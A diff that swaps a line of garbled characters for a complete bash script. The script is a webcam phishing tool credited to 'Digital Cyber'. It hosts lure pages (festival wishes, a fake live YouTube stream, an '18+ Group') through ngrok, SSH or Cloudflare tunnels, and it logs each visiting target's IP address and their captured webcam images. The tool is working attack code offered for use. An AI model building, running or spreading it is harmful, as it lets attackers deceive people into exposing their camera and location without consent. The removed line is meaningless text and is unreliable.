@@ -1,1 +1,336 @@
-fwe212Jh1xWZBiNI4T5QFR3XjoKj4aIyaUpPhooPergq12OzjFtgqGTykPpnNDZsd]N0ZhsUqFBYAj8tI3kGR37tfTgoYc6x9D6ON8jIs7a8tEuQKXs1hVJcAlehIA2ZBT)2FdG8gQPIX48UkLGJ6IIUED1hGtdA6xR7kWphp8ov3152LJvsjyCfTzYQMB]Lyp7FFtj7wdnfnt7xH1B3iE39yazKVjNQgEqqJzF272hbC3yVypgcv8RMjsxQQxquyx25cDImTQNf9CisqMreIVaQQy)R0xzDR)s9NRqvYJ]VOQXodJQbCRQ4FK4GL)L0b0CmdVPYZ0VSiichYKgzTWMaYc]tf231hn0L4yuEDoGsY)rHNr)sKeI1T6J3no8l22RdKc6rScvAxc7PcYBY8uD]1zzXZ14gsGSD6P1vLlIQG3X6vMXtTVadxZ2qymiIMGY0YEDN)uwr7sWygLl9UYXMVqm9cwSCwGNOIHiWJOhyPOlBT)zCOTg]1ccudlI3PoqD4noW3giYdJqJx8vNKDjuSwMw4bI5eK8wPkcjVGaZnbE0H02RMSvQk27zdnhDAb0SIWbwG5a)ZFVMJMoj9Ykon)TjUFzx67KaWacF8oghodsz3PrqcBBCyPQMBWYCPVMJ5QHyxNaZ6giEdAwNVZlaI5kxW4wasTBtow6YdSuVKnSGJ01nP]oWQGx6pI0pPY6NzTlDJGB47MzNJMHnUVdQS3U)ryFG67Qo2F85ZDWIo2ulsvDNqIK4pFMNTIZTK5GzPs4yhyWznpl0FvX)mindxLgKzojUl8kdaRvOPm1)Nuua36qH2OCagZPIA04XGkJZweD]lNDhf5qGPrSGF6NMMLIcusPYXSQET)CnkK]cCNpOzfZN)Qo05K0JzpjvpVPoxXQDAr0MgWqJuNKAxOitkFuwvIPFJ6Q5rkUxAUlBFFWwo6kvI95lk1bQIO08H4ERRP7aEPJlalZqrvnyHCTVLJk0)iZ47TO4w5GYOdEg0L63TgfAhMqxkTCFbZqhfwICknlpdZTFVKxicYk]Igl600aF2N2Vojkgh]j1r32)73eB0hftYM5bX]BfYS6O5CCSktUA1BHs1kO1UBUi7lXB9mjjBGs8OzSxJd31X9Jj)HKjOe5lMKqJt56L6oPzWnWdRvJU7Vzs]YCaitUwEtecG9oQQqFc16twH]Z5fsp9K6sbE8S]KNaqTXHIvp7uwLEyIiZwp7Qp]yw7QS)oJZ7I4us]eAQjAR5L9zUtwnGouhwJ5U)nBNbmMs8da2]Wf3MNPCgcu9nfeAkrkuaHmUF3pBV81w4cmA8rV8rrmSUSNfRSNMW3PsdDYTXFy63iiE3iQ8j2FesvOmqa72mkUx2r)E2)AQSoAkjzfhKarMw7ro4bVUppWorjB])grDOWHQheZyJfm4aR9RF9]rxh1MwqxuacgUQ1MbcwaJltJa2zcS7eyri6EM1FkHKucVFBKx0xG5G7)eoFDxvwYR57A9OaoW0WbCt1y1BORnhwpezmBXKSGd1hiuH5NB)DBxrC6vjUINFV)o2Rdwbh0)OFTqblWcykiXkGizn6Ojqtau0tmbHFUj7]JanHGiaa6zfzpEz6yE2q]QBhR18LTgnqjyJsMCdKMmQPAbWqpjbduKCKVkVUE7nrnlOH3ca35XryjezfJJDPDZliKxhKTtcfUdEU3CX0TsYGgEFe7glsf)C2FI)2tEBiPEUdUbH3EBamialfkujjG4F2t1Q4htWMcTiefXfEEblqDoRPGI7Q8w95)xEahpvs6]1wOfVDUrD8xcmhf7HrH)sxei9VftwGthL1LurkaAdxZ4rN5ZuxDaDeXWk8eTVcN7zP2xa2f6A)wg]u)KIOj6w17gKKXXF89oYffHQRPxzqtyNl3AyHkJP5KxSrJzOygDhuYTyDlJIhndoAhA7TdOtOYMSHX9)8uqy9kUhyOhyx7LzTXh9M0POlFEa2tj0u9nuCsZJ5WOgdzWP1r)ZRZbWO4)X1j]6RIdJVosjrUafynFNOS5o6CgYuDfiG]rTNNz)w7mjkYt3we]lIlkJX5R)CXBMVabH4wsWFxzeemiqw9sGX)c2P2Am49mwr8Y91pgkQeopd]r4c1A0DQM]c0VGOcrAoVPL)pxVTnDxaymK2p7EDxncbRdCUB0KIKoU2qNXd2FkDFJA4kZH0h1rDU9r93Wh5F0ya8ryDlSLOf02lxX)hJLedIscO145Ws812]51dBknhAqY86zf6al9y1mv0AWrNii3K8zJxwWhYmtVvxeAau8a3hfdMMvoYZdNxT5t6zM3Y6R)crZ7ZLMqrf7mCN0s7Yk9Fg0F70al5yLgP]M0bHWqJ8g1vbx9xtJBNQpkZ)Yv6w4mp6Gzr43RCmvaPSYEeF4L]H0chcZIsMh]FTnni4GLBYYecfrgFqn0edw0EdDABGbM62Z8zlNBT9gZ25IlAMzsX7HVl)5)qyg8phZkD8rkkrpujSDwAqA3z]E43sOCPfFnYdYykwzFR)5lFURk9hjUzhRIMhg4aqD9GviSQRtJVPZqC4p)698AOfDPKwGdfQsskN7cFngGnZ4QxdnjMr]tQLCnYOc5DFz42FgZ2Ns9p2nmRZao7w5kjfeo2Ve1fHpieyXa]ZAuv9jih)9ZClrao6yCR6apSmw26Qq]i5dZiivDQOgFkpTnYEu7tT428l]X1TykENUAW6OUhmnf2scnCAtQAtZ]jnCXIm7fY8TotYV0KatDGaYbch8y3UT6tQmY)cQfysQzSY78e2s)F)2r7bSv)ZsHx]TLDA4hAJq1]aUha0voNXX]kIYd3z5AXeOI2OSbeV2UzKy7gUQthlQRZSO7KKGSK6O)lSGHICzkbHPTOt9]fsiMZcnW0lLK7h)jzFTgKGpE2P9wVIlX1mMft8VwKydi)S66cCs9Rz5ubJXfVOFzfic]nyfs]riJb1YFp7ZsJqMBkY6WyGAy98sjiLGQ8mhIXpqPPB1Ftc23B0vJmWmgoeqnj7qyefvU7AQPE2KUTf2QVk]DSK1EWAhozLvgNj]7lae0gjTmQxUqTpaL)XgTUpNR22d)ZRZqEJWq7JEuN)6JbHwuM9RrZdxhaDzxPKwR7mGlbvF4c29Wwm2dhdaCLBMRj6zRgTxfcNpn8m5L]yb67GNK1nm9R)1fRVW8NG8gnEnVzrlpvzLRIIOF1HI7iJjJU]tSMRV1CmL2JhKCvcdjBUujclT])ugod735xoQV)iWtmKNjp5biPpCPiPOXP7lJcWEln0v0IIC7of1XpJtEApE)2!
+#!/bin/bash
+
+trap 'printf "\n";stop' 2
+
+banner() {
+clear
+echo -e "\e[1;32m
+    ██╗    ██╗███████╗██████╗  ██████╗ █████╗ ███╗   ███╗\e[0m"
+echo -e "\e[1;34m    ██║    ██║██╔════╝██╔══██╗██╔════╝██╔══██╗████╗ ████║\e[0m"
+echo -e "\e[1;36m    ██║ █╗ ██║█████╗  ██████╔╝██║     ███████║██╔████╔██║\e[0m"
+echo -e "\e[1;35m    ██║███╗██║██╔══╝  ██╔══██╗██║     ██╔══██║██║╚██╔╝██║\e[0m"
+echo -e "\e[1;33m    ╚███╔███╔╝███████╗██████╔╝╚██████╗██║  ██║██║ ╚═╝ ██║
+     ╚══╝╚══╝ ╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝
+\e[0m"
+echo -e "\e[1;34m  <========================================================>\e[0m\n"
+echo -e "\e[1;92m         WELCOME To Webcam\e[1;97m => \e[1;96mCreate by Digital Cyber          \e[0m\n"
+echo -e "\e[1;92m  <========================================================>\e[0m"
+echo -e "\e[1;91m     YouTube Bangla\e[1;90m => \e[1;93m https://www.youtube.com/@DigitalCyber-c5n\e[0m"
+echo -e "\e[1;92m  <========================================================>\e[0m"
+echo -e "\e[1;95m          Subscribe my YouTube Channel DigitalCyber-c5n\e[0m"
+echo -e "\e[1;34m  <========================================================>\e[0m\n"
+}
+
+
+dependencies() {
+
+
+command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+ 
+
+
+}
+
+stop() {
+
+checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
+checkphp=$(ps aux | grep -o "php" | head -n1)
+checkssh=$(ps aux | grep -o "ssh" | head -n1)
+if [[ $checkngrok == *'ngrok'* ]]; then
+pkill -f -2 ngrok > /dev/null 2>&1
+killall -2 ngrok > /dev/null 2>&1
+fi
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+if [[ $checkssh == *'ssh'* ]]; then
+killall -2 ssh > /dev/null 2>&1
+fi
+exit 1
+
+}
+
+catch_ip() {
+
+ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+IFS=$'\n'
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+
+cat ip.txt >> saved.ip.txt
+
+
+}
+
+checkfound() {
+
+printf "\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+while [ true ]; do
+
+
+if [[ -e "ip.txt" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
+catch_ip
+rm -rf ip.txt
+
+fi
+
+sleep 0.5
+
+if [[ -e "Log.log" ]]; then
+printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+rm -rf Log.log
+fi
+sleep 0.5
+
+done 
+
+}
+
+Master() {
+
+command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
+
+printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Server...\e[0m\n"
+
+if [[ $checkphp == *'php'* ]]; then
+killall -2 php > /dev/null 2>&1
+fi
+
+ssh -R 80:localhost:3333 nokey@localhost.run  2> /dev/null > sendlink &
+
+sleep 8
+
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+sleep 3
+
+send_link=$(grep -o "https://[0-9a-z]*\.lhr.life" sendlink)
+
+printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
+ssh_server
+checkfound
+}
+
+
+Ngrok() {
+
+link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
+sed 's+forwarding_link+'$link'+g' check.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' wish.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
+sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
+else
+sed 's+forwarding_link+'$link'+g' Xindex.html > index.html
+fi
+rm -rf index3.html
+
+}
+
+select_template() {
+    if [[ $option_server -gt 3 || $option_server -lt 0 ]]; then
+        printf "\e[1;93m [!] Invalid tunnel option! Try again.\e[0m\n"
+        sleep 1
+        clear
+        banner
+        masterphish
+    else
+        printf "\n----- Choose a template ----\n"
+        printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Friends wishes\e[0m\n"
+        printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live YouTube\e[0m\n"
+        printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m 18+ Group\e[0m\n"
+
+        default_option_template="2"
+        read -p $'\n\e[1;92m[+] Choose an option Number\e[1;93m[Default YouTube]: \e[0m' option_tem
+        option_tem="${option_tem:-${default_option_template}}"
+
+        if [[ $option_tem -eq 1 ]]; then
+            read -p $'\n\e[1;92m[+] Enter festival name: \e[0m' fest_name
+            fest_name="${fest_name//[[:space:]]/}"
+
+        elif [[ $option_tem -eq 2 ]]; then
+            read -p $'\n\e[1;92m[+] Enter YouTube Video link: \e[0m' yt_video_url
+
+        elif [[ $option_tem -eq 3 ]]; then
+            echo -e "\e[1;92m[✔] 18+ Group Selected.\e[0m"
+
+        else
+            printf "\e[1;93m [!] Invalid template option! Try again.\e[0m\n"
+            sleep 1
+            select_template
+        fi
+    fi
+}
+
+
+ngrok_server() {
+    if command -v ngrok &> /dev/null; then
+        echo ""
+    else
+        echo "Installing Ngrok..."
+        pkg install -y wget unzip
+        wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip
+        unzip ngrok.zip
+        mv ngrok $PREFIX/bin/
+        rm ngrok.zip
+        echo "Ngrok installation complete."
+    fi
+
+    # Check if Ngrok token is already set
+    fuser -k 3333/tcp > /dev/null 2>&1
+    php -S localhost:3333 > /dev/null 2>&1 &
+    ngrok tcp 3333 > /dev/null 2>&1 &
+
+    sleep 10
+	#!/bin/bash
+
+ TUNNEL_DATA=$(curl -s http://localhost:4040/api/tunnels)
+
+if echo "$TUNNEL_DATA" | jq -e '.tunnels[] | select(.proto == "http")' > /dev/null; then
+    URL=$(echo "$TUNNEL_DATA" | jq -r '.tunnels[] | select(.proto == "http") | .public_url')
+    echo "🟢 HTTP URL: $URL"
+else
+    TCP_URL=$(echo "$TUNNEL_DATA" | jq -r '.tunnels[] | select(.proto == "tcp") | .public_url')
+    HTTP_STYLE_URL=$(echo "$TCP_URL" | sed 's/tcp:/http:/')
+    echo -e "\e[1;92m[+] Ngrok Link:\e[0m\e[1;77m \e[0m"$HTTP_STYLE_URL
+    fi
+Ngrok
+checkfound
+}
+
+cloudflare_tunnel() {
+rm -f cf_tunnel.log
+
+if command -v cloudflared &> /dev/null
+then
+    echo ""
+else
+    echo "Installing Cloudflared..."
+    pkg update -y
+    pkg install -y cloudflared
+
+    echo "Cloudflared installation complete."
+fi
+
+printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server...\e[0m\n"
+fuser -k 3333/tcp > /dev/null 2>&1
+php -S localhost:3333 > /dev/null 2>&1 &
+cloudflared tunnel --url http://localhost:3333 --no-autoupdate > cf_tunnel.log 2>&1 &
+
+sleep 10
+link=$(grep -o 'https://[^ ]*\.trycloudflare.com' cf_tunnel.log | head -n 1)
+
+if [[ -z "$link" ]]; then
+    printf "\e[1;31m[!] Cloudflare Tunnel Failed, Check Your Internet!\e[0m\n"
+    exit 1
+else
+    printf "\e[1;92m[+] Cloudflare Link:\e[0m \e[1;77m%s\e[0m\n" $link
+fi
+cl_server
+checkfound
+}
+
+masterphish() {
+    if [[ -e send_link ]]; then
+        rm -rf send_link
+    fi
+
+    printf "\n----- Choose tunnel server -----\n"
+    printf "\n\e[1;92m[\e[1;96m00\e[1;92m]\e[0m\e[1;93m Custom Server\e[0m\n"
+    printf "\e[1;92m[\e[1;96m01\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
+    printf "\e[1;92m[\e[1;96m02\e[1;92m]\e[0m\e[1;93m Server SSH\e[0m\n"
+    printf "\e[1;92m[\e[1;96m03\e[1;92m]\e[0m\e[1;93m Cloudflare \e[0m\n"
+
+    default_option_server="0"
+    read -p $'\n\e[1;92m[+] Choose a Port Forwarding option:\e[1;93m[Default is 00] \e[0m' option_server
+    option_server="${option_server:-${default_option_server}}"
+    
+    select_template
+
+    if [[ "$option_server" == "0" || "$option_server" == "00" ]]; then
+    custom_server
+
+    elif [[ "$option_server" == "1" || "$option_server" == "01" ]]; then
+        ngrok_server
+
+    elif [[ "$option_server" == "2" || "$option_server" == "02" ]]; then
+        Master
+
+    elif [[ "$option_server" == "3" || "$option_server" == "03" ]]; then
+        cloudflare_tunnel
+
+    else
+        echo -e "\e[1;93m[!] Invalid option!\e[0m"
+        sleep 1
+        clear
+        masterphish
+    fi
+}
+
+custom_server() {
+echo -e "\n\e[1;95m[+] Default port 8080 \e[0m"
+read -p $'\n\e[1;92m[+] Enter your Custom (http&https://example.com): \e[0m' send_link
+
+php -S php -S localhost:8080 > /dev/null 2>&1 &
+
+sed 's+forwarding_link+'$send_link'+g' check.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' wish.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
+sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
+else
+sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
+sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
+fi
+rm -rf index3.html
+
+printf "\n\e[1;92m[+] Custom Server Hosted Successfully:\e[1;93m $send_link\e[0m\n"
+checkfound
+}
+
+ssh_server() {
+
+link=$(grep -o "https://[0-9a-z]*\.lhr.life" sendlink)
+sed 's+forwarding_link+'$send_link'+g' check.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' wish.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
+sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
+else
+sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
+sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
+fi
+rm -rf index3.html
+checkfound
+}
+
+cl_server() {
+
+link=$(grep -o 'https://[^ ]*\.trycloudflare.com' cf_tunnel.log | head -n 1)
+sed 's+forwarding_link+'$send_link'+g' check.php > index.php
+if [[ $option_tem -eq 1 ]]; then
+sed 's+forwarding_link+'$link'+g' wish.html > index3.html
+sed 's+fes_name+'$fest_name'+g' index3.html > index.html
+elif [[ $option_tem -eq 2 ]]; then
+sed 's+forwarding_link+'$link'+g' YouTube.html > index3.html
+sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
+else
+sed 's+forwarding_link+'$link'+g' Xindex.html > index3.html
+sed 's+live_yt_tv+'$yt_video_url'+g' index3.html > index.html
+fi
+rm -rf index3.html
+checkfound
+}
+
+banner
+dependencies
+masterphish
